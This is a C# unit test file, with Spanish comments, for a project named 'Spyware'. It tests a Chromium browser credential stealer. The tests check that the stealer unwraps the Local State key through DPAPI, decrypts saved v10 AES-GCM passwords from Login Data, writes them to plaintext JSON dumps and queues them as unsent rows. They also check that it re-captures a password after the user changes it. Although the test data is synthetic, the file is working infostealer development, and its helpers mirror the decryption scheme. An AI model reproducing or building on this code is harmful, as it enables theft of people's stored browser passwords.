using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;
using Spyware.Collectors.Browsers;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Security;
using Spyware.Storage;
using Xunit;

namespace Spyware.UnitTests;

/// <summary>
/// Prueba funcional del pipeline de credenciales sobre un perfil de Chromium
/// sintético: copia de Login Data, lectura SQLite, DPAPI sobre Local State y
/// descifrado AES-GCM. El perfil se construye con datos inventados.
/// </summary>
public sealed class ChromiumPipelineTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "spyware-chrome-" + Guid.NewGuid().ToString("N"));

    [Fact]
    public void Collect_DecryptsV10_FlagsV20_AndWritesPlainDump()
    {
        byte[] aesKey = new byte[32];
        RandomNumberGenerator.Fill(aesKey);
        string secret = "Contras3ña-§|~";
        string userDataRoot = BuildSyntheticProfile(aesKey, secret);

        AgentPaths paths = new(Path.Combine(_root, "datos"));
        paths.EnsureDirectories();

        BrowserSection config = new() { KeepEncryptedBlob = true, WriteDumpFile = true, MaxResultsPerRun = 50 };
        var extractor = new ChromiumCredentialExtractor(BrowserDefinition.Chrome, userDataRoot, paths, config, new TestLog());

        IReadOnlyList<CredentialEvent> results = extractor.Collect();

        List<CredentialEvent> decrypted = results.Where(r => r.Status == CredentialStatus.Decrypted).ToList();
        CredentialEvent one = Assert.Single(decrypted);
        Assert.Equal(secret, one.Password);
        Assert.Equal("https://lab.example.com", one.Url);
        Assert.Equal("operadora@ejemplo.local", one.Username);
        Assert.Equal("Default", one.Profile);
        Assert.Equal("chrome", one.Browser);
        Assert.NotNull(one.EncryptedBlobBase64);
        Assert.NotNull(one.CreatedAt);
        Assert.InRange(one.CreatedAt!.Value, DateTime.UtcNow.AddDays(-2), DateTime.UtcNow.AddMinutes(5));

        List<CredentialEvent> unsupported = results.Where(r => r.Status == CredentialStatus.Unsupported).ToList();
        CredentialEvent appBound = Assert.Single(unsupported);
        Assert.Equal("app_bound_v20", appBound.FailureReason);
        Assert.Null(appBound.Password);

        // Volcado en texto plano (requisito: nada propio cifrado). El JSON escapa
        // los caracteres no ASCII, así que se compara con la forma serializada.
        string[] dumps = Directory.GetFiles(paths.CredentialDirectory, "creds_chrome_*.json");
        Assert.NotEmpty(dumps);
        string dumpText = File.ReadAllText(dumps[0]);
        Assert.Contains("operadora@ejemplo.local", dumpText, StringComparison.Ordinal);
        Assert.Contains("https://lab.example.com", dumpText, StringComparison.Ordinal);
        Assert.Contains(JsonSerializer.Serialize(secret), dumpText, StringComparison.Ordinal);
        Assert.Contains("djEw", dumpText, StringComparison.Ordinal);   // blob "v10…" en base64
    }

    [Fact]
    public void Collect_SinLocalState_DevuelveFilasConClaveIndisponible()
    {
        string userDataRoot = Path.Combine(_root, "sin-local-state");
        Directory.CreateDirectory(Path.Combine(userDataRoot, "Default"));
        File.WriteAllBytes(Path.Combine(userDataRoot, "Default", "Login Data"), Array.Empty<byte>());

        AgentPaths paths = new(Path.Combine(_root, "datos2"));
        paths.EnsureDirectories();

        var extractor = new ChromiumCredentialExtractor(
            BrowserDefinition.Edge, userDataRoot, paths, new BrowserSection { WriteDumpFile = false }, new TestLog());

        IReadOnlyList<CredentialEvent> results = extractor.Collect();

        CredentialEvent row = Assert.Single(results);
        Assert.Equal(CredentialStatus.Corrupted, row.Status);
        Assert.Equal("sqlite_error", row.FailureReason);
    }

    [Fact]
    public void KeyProvider_ReconstruyeClaveDPAPI_y_DistingueFallos()
    {
        byte[] key = new byte[32];
        RandomNumberGenerator.Fill(key);
        string directory = Path.Combine(_root, "local-state");
        Directory.CreateDirectory(directory);

        string good = Path.Combine(directory, "Local State");
        File.WriteAllText(good, JsonSerializer.Serialize(new
        {
            os_crypt = new
            {
                encrypted_key = Convert.ToBase64String(
                    Encoding.ASCII.GetBytes("DPAPI")
                        .Concat(ProtectedData.Protect(key, optionalEntropy: null, DataProtectionScope.CurrentUser))
                        .ToArray())
            }
        }));

        KeyResult ok = ChromiumKeyProvider.TryGetKey(good, new TestLog());
        Assert.Null(ok.Failure);
        Assert.Equal(key, ok.AesKey);

        string missing = Path.Combine(directory, "Local State sin clave");
        File.WriteAllText(missing, """{ "browser": { "x": 1 } }""");
        Assert.Equal("os_crypt_missing", ChromiumKeyProvider.TryGetKey(missing, new TestLog()).Failure);

        string shortKey = Path.Combine(directory, "Local State clave corta");
        File.WriteAllText(shortKey, JsonSerializer.Serialize(new
        {
            os_crypt = new
            {
                encrypted_key = Convert.ToBase64String(
                    Encoding.ASCII.GetBytes("DPAPI")
                        .Concat(ProtectedData.Protect(new byte[7], optionalEntropy: null, DataProtectionScope.CurrentUser))
                        .ToArray())
            }
        }));
        KeyResult shortResult = ChromiumKeyProvider.TryGetKey(shortKey, new TestLog());
        Assert.Equal("unexpected_key_length_7", shortResult.Failure);
        Assert.Null(shortResult.AesKey);
    }

    [Fact]
    public void Proveedor_LaCredencialRepetidaNoSeVuelve_aRegistrar_YUnCambioSi()
    {
        byte[] aesKey = new byte[32];
        RandomNumberGenerator.Fill(aesKey);

        // El provider se apunta a un %LOCALAPPDATA% falso con la ruta conocida de Chrome.
        string fakeAppData = Path.Combine(_root, "appdata");
        string userDataRoot = Path.Combine(fakeAppData, "Google", "Chrome", "User Data");
        BuildSyntheticProfile(aesKey, "clave-original", userDataRoot);

        AgentPaths paths = new(Path.Combine(_root, "datos-proveedor"));
        paths.EnsureDirectories();

        var log = new TestLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var provider = new BrowserCredentialProvider(paths, repository, new SpoolManager(paths, log),
            new BrowserSection { Edge = false, SkipUnchanged = true }, log, fakeAppData);

        Assert.Equal(2, provider.CollectAll());

        // El navegador no avisa de los cambios: cada ciclo vuelve a ver lo mismo y el hash
        // (blob + contraseña + estado) es lo que evita repetir la fila.
        Assert.Equal(0, provider.CollectAll());
        Assert.Equal(0, provider.CollectAll());
        Assert.Equal(2, repository.GetStats()["credentials"]);

        ChangePassword(userDataRoot, aesKey, "clave-nueva");

        // Cambió la contraseña: vuelve a registrarse, con su fila nueva.
        Assert.Equal(1, provider.CollectAll());
        Assert.Equal(3, repository.GetStats()["credentials"]);
        Assert.Equal(0, provider.CollectAll());

        CredentialRow updated = repository.GetUnsentCredentials(10)
            .Single(row => row.Password == "clave-nueva");

        Assert.Equal(CredentialStatus.Decrypted, updated.Status);
        Assert.Equal("operadora@ejemplo.local", updated.Username);
        Assert.Equal("https://lab.example.com", updated.Url);
        Assert.Equal("chrome", updated.Browser);
    }

    [Fact]
    public void Proveedor_SkipUnchangedApagado_RepiteLaLecturaCadaCiclo()
    {
        byte[] aesKey = new byte[32];
        RandomNumberGenerator.Fill(aesKey);

        string fakeAppData = Path.Combine(_root, "appdata-sin-filtro");
        string userDataRoot = Path.Combine(fakeAppData, "Google", "Chrome", "User Data");
        BuildSyntheticProfile(aesKey, "clave-fija", userDataRoot);

        AgentPaths paths = new(Path.Combine(_root, "datos-sin-filtro"));
        paths.EnsureDirectories();

        var log = new TestLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var provider = new BrowserCredentialProvider(paths, repository, new SpoolManager(paths, log),
            new BrowserSection { Edge = false, SkipUnchanged = false }, log, fakeAppData);

        Assert.Equal(2, provider.CollectAll());
        Assert.Equal(2, provider.CollectAll());
        Assert.Equal(4, repository.GetStats()["credentials"]);
        Assert.Equal(0, provider.SkippedUnchangedCount);
    }

    /// <summary>Lo que hace el usuario al cambiar su contraseña: reescribir el blob de la fila.</summary>
    private static void ChangePassword(string userDataRoot, byte[] aesKey, string secret)
    {
        using var connection = new SqliteConnection(
            $"Data Source={Path.Combine(userDataRoot, "Default", "Login Data")};Pooling=False;");
        connection.Open();

        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = "UPDATE logins SET password_value = $blob WHERE origin_url = $url;";
        command.Parameters.AddWithValue("$blob", BuildV10(aesKey, Encoding.UTF8.GetBytes(secret)));
        command.Parameters.AddWithValue("$url", "https://lab.example.com");
        command.ExecuteNonQuery();

        SqliteConnection.ClearAllPools();
    }

    /// <summary>Crea Local State + Default/Login Data como los genera Chromium.</summary>
    private string BuildSyntheticProfile(byte[] aesKey, string secret, string? targetRoot = null)
    {
        string userDataRoot = targetRoot ?? Path.Combine(_root, "perfil");
        string profileDirectory = Path.Combine(userDataRoot, "Default");
        Directory.CreateDirectory(profileDirectory);

        byte[] dpapiWrapped = Encoding.ASCII.GetBytes("DPAPI")
            .Concat(ProtectedData.Protect(aesKey, optionalEntropy: null, DataProtectionScope.CurrentUser))
            .ToArray();

        File.WriteAllText(
            Path.Combine(userDataRoot, "Local State"),
            JsonSerializer.Serialize(new { os_crypt = new { encrypted_key = Convert.ToBase64String(dpapiWrapped) } }));

        long createdMicros = (DateTime.UtcNow.Ticks - new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc).Ticks) / 10;

        using var connection = new SqliteConnection(
            $"Data Source={Path.Combine(profileDirectory, "Login Data")};Pooling=False;");
        connection.Open();

        using (SqliteCommand schema = connection.CreateCommand())
        {
            schema.CommandText = """
                CREATE TABLE logins (
                    origin_url TEXT,
                    username_value TEXT,
                    password_value BLOB,
                    date_created INTEGER,
                    date_last_used INTEGER,
                    times_used INTEGER,
                    blacklisted_by_user INTEGER DEFAULT 0
                );
                """;
            schema.ExecuteNonQuery();
        }

        using (SqliteCommand insert = connection.CreateCommand())
        {
            insert.CommandText = """
                INSERT INTO logins (origin_url, username_value, password_value, date_created, date_last_used, times_used)
                VALUES ($url, $user, $blob, $created, $created, 3);
                """;
            insert.Parameters.AddWithValue("$url", "https://lab.example.com");
            insert.Parameters.AddWithValue("$user", "operadora@ejemplo.local");
            insert.Parameters.AddWithValue("$blob", BuildV10(aesKey, Encoding.UTF8.GetBytes(secret)));
            insert.Parameters.AddWithValue("$created", createdMicros);
            insert.ExecuteNonQuery();
        }

        using (SqliteCommand insert = connection.CreateCommand())
        {
            insert.CommandText = """
                INSERT INTO logins (origin_url, username_value, password_value, date_created, date_last_used, times_used)
                VALUES ($url, $user, $blob, $created, $created, 1);
                """;
            insert.Parameters.AddWithValue("$url", "https://app-bound.example.com");
            insert.Parameters.AddWithValue("$user", "appbound");
            insert.Parameters.AddWithValue("$blob", Encoding.ASCII.GetBytes("v20" + new string('B', 40)));
            insert.Parameters.AddWithValue("$created", createdMicros);
            insert.ExecuteNonQuery();
        }

        SqliteConnection.ClearAllPools();
        return userDataRoot;
    }

    private static byte[] BuildV10(byte[] key, byte[] plain)
    {
        byte[] nonce = new byte[12];
        RandomNumberGenerator.Fill(nonce);
        byte[] tag = new byte[16];
        byte[] cipher = new byte[plain.Length];

        using var aes = new AesGcm(key, 16);
        aes.Encrypt(nonce, plain, cipher, tag);

        byte[] blob = new byte[3 + nonce.Length + cipher.Length + tag.Length];
        Encoding.ASCII.GetBytes("v10").AsSpan().CopyTo(blob.AsSpan(0));
        nonce.AsSpan().CopyTo(blob.AsSpan(3));
        cipher.AsSpan().CopyTo(blob.AsSpan(3 + nonce.Length));
        tag.AsSpan().CopyTo(blob.AsSpan(3 + nonce.Length + cipher.Length));
        return blob;
    }

    public void Dispose()
    {
        try { SqliteConnection.ClearAllPools(); } catch { /* cierre best-effort */ }
        try { if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true); } catch { /* mejor esfuerzo */ }
    }

    private sealed class TestLog : ILog
    {
        public LogLevel MinimumLevel { get; set; } = LogLevel.Debug;
        public bool MirrorToConsole { get; set; }

        public void Debug(string message) { }
        public void Info(string message) { }
        public void Warn(string message) { }
        public void Error(string message, Exception? exception = null) { }
    }
}
